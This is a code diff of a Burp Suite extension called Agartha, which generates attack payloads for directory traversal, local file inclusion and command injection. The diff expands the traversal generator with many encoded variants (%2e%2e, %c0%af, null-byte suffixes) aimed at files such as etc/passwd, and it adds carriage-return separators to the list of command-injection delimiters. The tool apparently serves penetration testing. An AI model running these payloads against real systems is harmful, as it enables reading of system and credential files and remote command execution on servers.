@@ -10,16 +10,14 @@ try:
     import re, urlparse, urllib, urllib2, time, ssl
     from java.util import ArrayList
     from threading import Thread
-    #from org.python.core.util import StringUtil
     from random import randrange
     
 
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.01"
+VERSION = "0.06"
 _colorful = True
-
 
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -28,7 +26,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._callbacks = callbacks
         self._helpers = callbacks.getHelpers()
         self._callbacks.setExtensionName("Agartha {RCE|LFI|Auth}")
-        print "Agartha is loading...v" + VERSION
+        print "Version " + VERSION + " is just loaded.\n\nAgartha is a payload generator for:\n\t\t* Local File Inclusion (LFI), Directory Traversal,\n\t\t* Remote Code Execution (RCE),\n\t\t* Authorization/Authentication Control\n\nFor more information and tutorial how to use, please visit:\n\t\thttps://github.com/volkandindar/agartha"        
         self._MainTabs = JTabbedPane()
         self._tabDictUI()
         self._tabAuthUI()
@@ -36,7 +34,93 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._MainTabs.addTab("Payload Generator", None, self._tabDictPanel, None)
         callbacks.addSuiteTab(self)
         callbacks.registerContextMenuFactory(self)
+        callbacks.issueAlert("The extension has been loaded.");
         self.tableMatrixReset(self)
+
+        return
+
+    def funcLFI(self, ev):
+        listem = []
+        dept= int(self._cbDictDepth.getSelectedItem())
+        counter = 0        
+
+        if self._txtDictParam.text.startswith('/') or self._txtDictParam.text.startswith('\\'):
+            self._txtDictParam.text = self._txtDictParam.text[1:]
+            
+        if self._cbDictEquality.isSelected():
+            counter = dept
+            
+        while counter <= dept:
+            _resultTxt = ""
+            i=1
+            while i <= counter:
+                _resultTxt += "../"
+                i = i + 1
+                
+            listem.append(_resultTxt + self._txtDictParam.text + "\n")
+            
+            if self._cbDictEncoding.isSelected():
+
+                listem.append(_resultTxt + self._txtDictParam.text + "%00index.html\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%20index.html\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%09index.html\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%0Dindex.html\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%FFindex.html\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%00\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%20\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%09\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%0D\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%FF\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "/..;/\n")
+                listem.append(_resultTxt + self._txtDictParam.text + ";index.html\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%20.jpg\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%09.jpg\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%0D.jpg\n")
+                listem.append(_resultTxt + self._txtDictParam.text + "%FF.jpg\n")
+
+                # backslash
+                # replace with /
+                delimetersSlash = ["%2f", "%252f", "%255c", "%c0%af", "%25c0%25af", "%c1%9c", "%25c1%259c", "%%32%66", "%%35%63", "/", "/", "/", "%u2215", "%u2216", "%uEFC8", "%uF025", "0x2f", "%c0%2f", "//", "///", "\\/", "\\/", "%uEFC8", "%uF025", "/\\", "/\\", "//", "%%32%66", "/"]
+                # replace with ..
+                delimetersDots = ["%2e%2e", "%252e%252e", "%252e%252e", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65", "%%32%65%%32%65", "\\..", "...", "....", "%uff0e%uff0e", "..", "..", "..", "0x2e0x2e", "%c0%2e%c0%2e", "..", "..", "..", "....", "..", "..", "..", "....", "....", "..", "%%32%65%%32%65"]
+                
+                for i in range(len(delimetersSlash)):
+                    listem.append((_resultTxt).replace("/", delimetersSlash[i]) + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt + self._txtDictParam.text).replace("/", delimetersSlash[i]) + "\n")
+                    listem.append((_resultTxt).replace("..", delimetersDots[i]) + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt + self._txtDictParam.text).replace("..", delimetersDots[i]) + "\n")
+                    listem.append((_resultTxt).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt + self._txtDictParam.text).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "\n")
+                # backslash
+
+                # forward slash
+                # # replace with \
+                delimetersSlash = ["%5c", "%255c", "\\", "\\", "\\", "\\\\", "%u2216", "0x5c", "%c0%5c", "\\\\", "\\\\\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "%c1%9c", "\\"]
+                # replace with ..
+                delimetersDots = ["%2e%2e", "%252e%252e", "..", "...", "....", "....", "%uff0e%uff0e", "0x2e0x2e", "%c0%2e%c0%2e", "..", "..", "0x2e0x2e", "%uff0e%uff0e", "%c0%ae%c0%ae", "%c0%2e%c0%2e", "%2e%2e", "%25c0%25ae%25c0%25ae", "%252e%252e", "..", "%c0%ae%c0%ae"] 
+                
+                for i in range(len(delimetersSlash)):
+                    listem.append((_resultTxt).replace("/", delimetersSlash[i]) + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt + self._txtDictParam.text).replace("/", delimetersSlash[i]) + "\n")
+                    listem.append((_resultTxt).replace("..", delimetersDots[i]) + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt + self._txtDictParam.text).replace("..", delimetersDots[i]) + "\n")
+                    listem.append((_resultTxt).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "/" + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "/" + self._txtDictParam.text + "\n")
+                    listem.append((_resultTxt + self._txtDictParam.text).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "\n")
+                # forward slash
+
+            counter = counter + 1
+
+        listem = list(set(listem))
+        listem.sort(reverse=True)
+        self._tabDictResultDisplay.setText(''.join(map(str, listem)))
+        self._lblStatusLabel.setText('File dictionary: "' + self._txtDictParam.text + '", with '+ str(len(listem)) + ' result. Please make sure payload encoding is disabled, unless you are sure what you are doing.')
+        
         return
 
 
@@ -397,7 +481,6 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._tabAuthSplitpane.setTopComponent(self._tabAuthPanel)
         self._tabAuthSplitpane.setBottomComponent(_tabsReqRes)
 
-
     def _tabDictUI(self):
         #top panel
         self._txtDefaultLFI="Example: 'etc/passwd', 'C:\\boot.ini'"
@@ -508,7 +591,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
     def isValid(self):
         # check if any special chars
         regex = re.compile('[@,\'\"!#$%^&*<>\|}{]')
-        if(regex.search(self._txtDictParam.text) == None):
+        if(regex.search(self._txtDictParam.text) == None) and self._txtDictParam.text.strip():
             #clear
             return True
         else:
@@ -538,14 +621,14 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
     def funcRCE(self, ev):
         listem = []
-        delimeters = ["", "'", "\\'", "\"", "\\\"", "&", "&&", "|", "||", ";", "`", "^", "%0a", "0x0a", "%0d", "0x0d", "%1a", "0x1a", "%00", "0x00", "\\n", "\\\\n"]
+        delimeters = ["", "'", "\\'", "\"", "\\\"", "&", "&&", "|", "||", ";", "`", "^", "%0a", "0x0a", "%0d", "0x0d", "%1a", "0x1a", "%00", "0x00", "\\n", "\\\\n", "\\r", "\\\\r"]
         for delimeter in delimeters:
             delimeter.strip()
             listem.append(delimeter + self._txtDictParam.text + "\n")
             listem.append(delimeter + self._txtDictParam.text + delimeter + "\n")
        
         delimeters = ["", "'", "\\'", "\"", "`", "\\\""]
-        delimeters2 = ["", "&", "&&", "|", "||", ";", "%0a", "0x0a", "%0d", "0x0d", "%1a", "0x1a", "\\n", "%00", "0x00", "\\\\n"]
+        delimeters2 = ["", "&", "&&", "|", "||", ";", "%0a", "0x0a", "%0d", "0x0d", "%1a", "0x1a", "\\n", "%00", "0x00", "\\\\n", "\\r", "\\\\r"]
         delimeters3 = ["", "'", "\\'", "\"", "`", "\\\""]
         for delimeter in delimeters:
             delimeter.strip()
@@ -570,188 +653,6 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         listem.sort()
         self._tabDictResultDisplay.setText(''.join(map(str, listem)))
         self._lblStatusLabel.setText('Remote code dictionary: "' + self._txtDictParam.text + '", with '+ str(len(listem)) + ' result.')
-        return
-
-    def funcLFI(self, ev):
-        listem = []
-        dept= int(self._cbDictDepth.getSelectedItem())
-        counter = 0
-        delimeter= "../"
-        delimeter2= "..\\"
-
-        if self._txtDictParam.text.startswith('/') or self._txtDictParam.text.startswith('\\'):
-            self._txtDictParam.text = self._txtDictParam.text[1:]
-            
-        if self._cbDictEquality.isSelected():
-            counter = dept
-            
-        while counter <= dept:
-            _resultTxt = ""
-            _resultTxt2 = ""
-            i=1
-            while i <= counter:
-                _resultTxt += delimeter
-                _resultTxt2 += delimeter2
-                i = i + 1
-                
-            listem.append(_resultTxt + self._txtDictParam.text + "\n")
-            
-            if self._cbDictEncoding.isSelected():
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "..//")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "//")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "...")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "....")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "....//")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "..../\\")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%uEFC8") + self._txtDictParam.text +"\n")
-                listem.append((_resultTxt).replace("/", "%uF025") + self._txtDictParam.text +"\n")
-            
-                listem.append(_resultTxt + self._txtDictParam.text + "%00index.html\n")
-                listem.append(_resultTxt + self._txtDictParam.text + "%00\n")
-                listem.append(_resultTxt + self._txtDictParam.text + ";index.html\n")
-                listem.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")
-
-                listem.append((_resultTxt).replace("/", "%2f")+ self._txtDictParam.text +"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%2f")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%2e%2e")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%2e%2e%2f")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%2e%2e").replace("/", "%2f")+"\n")
-                
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "..\\/")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "\\/")+"\n")
-                
-
-                listem.append((_resultTxt).replace("/", "%252f")+ self._txtDictParam.text +"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%252f")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%252e%252e")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%252e%252e%252f")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%252e%252e").replace("/", "%252f")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%u2215")+ self._txtDictParam.text +"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%u2215")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%uff0e%uff0e")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%uff0e%uff0e%u2215")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%uff0e%uff0e").replace("/", "%u2215")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%c0%af")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%c0%af")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%c0%ae%c0%ae%c0%af")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae").replace("/", "%c0%af")+"\n")
-                
-                listem.append((_resultTxt).replace("/", "%25c0%25af")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%25c0%25af")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%25c0%25ae%25c0%25ae%25c0%25af")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae").replace("/", "%25c0%25af")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%c1%9c")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%c1%9c")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%c0%ae%c0%ae%c1%9c")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae").replace("/", "%c1%9c")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%25c1%259c")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%25c1%259c")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%25c0%25ae%25c0%25ae%25c1%259c")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae").replace("/", "%25c1%259c")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%%32%66")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%%32%66")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%%32%65%%32%65")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%%32%65%%32%65%%32%66")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%%32%65%%32%65").replace("/", "%%32%66")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%%35%63")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%%35%63")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%%32%65%%32%65")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%%32%65%%32%65%%35%63")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%%32%65%%32%65").replace("/", "%%35%63")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%u2216")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%u2216")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%uff0e%uff0e")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%uff0e%uff0e%u2216")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%uff0e%uff0e").replace("/", "%u2216")+"\n")
-
-                listem.append((_resultTxt).replace("/", "0x2f")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "0x2f")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "0x2e0x2e")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "0x2e0x2e0x2f")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "0x2e0x2e").replace("/", "0x2f")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%c0%2f")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%c0%2f")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%c0%2e%c0%2e%c0%2f")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e").replace("/", "%c0%2f")+"\n")
-
-                listem.append((_resultTxt).replace("/", "%c0%5c")+ self._txtDictParam.text+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%c0%5c")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%c0%2e%c0%2e%c0%5c")+"\n")
-                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e").replace("/", "%c0%5c")+"\n")
-                
-                listem.append((_resultTxt2 + self._txtDictParam.text)+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text)+"\n")
-                listem.append(((_resultTxt2)[:-1] + "//" + self._txtDictParam.text)+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("\\", "\\\\")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" +  self._txtDictParam.text).replace("\\", "\\\\")+"\n")
-                listem.append(((_resultTxt2)[:-1]).replace("\\", "\\\\") + "/" +  self._txtDictParam.text +"\n")
-                listem.append((_resultTxt2).replace("\\", "\\\\") + self._txtDictParam.text +"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "...")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "...")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "....")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "....\\\\")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "....")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..\\", "....\\\\")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("\\", "%255c")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("\\", "%255c")+"\n")
-                listem.append((_resultTxt2).replace("\\", "%255c") + self._txtDictParam.text +"\n")
-                listem.append(((_resultTxt2)[:-1]).replace("\\", "%255c") + "/" + self._txtDictParam.text +"\n")
-                listem.append(((_resultTxt2)[:-1]).replace("\\", "%255c") + "\\" + self._txtDictParam.text +"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("\\", "%5c")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("\\", "%5c")+"\n")
-                listem.append(((_resultTxt2)[:-1]).replace("\\", "%5c") + "/" + self._txtDictParam.text + "\n")
-                listem.append(((_resultTxt2)[:-1]).replace("\\", "%5c") + "\\" + self._txtDictParam.text + "\n")
-                listem.append((_resultTxt2).replace("\\", "%5c") + self._txtDictParam.text + "\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("\\", "0x5c")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("\\", "0x5c")+"\n")
-                listem.append((_resultTxt2).replace("\\", "0x5c")+ self._txtDictParam.text + "\n")
-                listem.append(((_resultTxt2)[:-1]).replace("\\", "0x5c") + "/" + self._txtDictParam.text + "\n")
-                listem.append(((_resultTxt2)[:-1]).replace("\\", "0x5c") + "\\" + self._txtDictParam.text + "\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%2e%2e")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%2e%2e")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "0x2e0x2e")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "0x2e0x2e")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%252e%252e")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%252e%252e")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%uff0e%uff0e")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%uff0e%uff0e")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "%2e%2e%5c")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%2e%2e").replace("\\", "%5c")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "%252e%252e%255c")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%252e%252e").replace("\\", "%255c")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "0x2e0x2e0x5c")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "0x2e0x2e").replace("\\", "0x5c")+"\n")
-                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "..\\/")+"\n")
-                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..\\", "..\\/")+"\n")
-                
-            counter = counter + 1
-
-        listem = list(set(listem))
-        listem.sort(reverse=True)
-        self._tabDictResultDisplay.setText(''.join(map(str, listem)))
-        self._lblStatusLabel.setText('File dictionary: "' + self._txtDictParam.text + '", with '+ str(len(listem)) + ' result.')
-        
         return
 
     def getTabCaption(self):
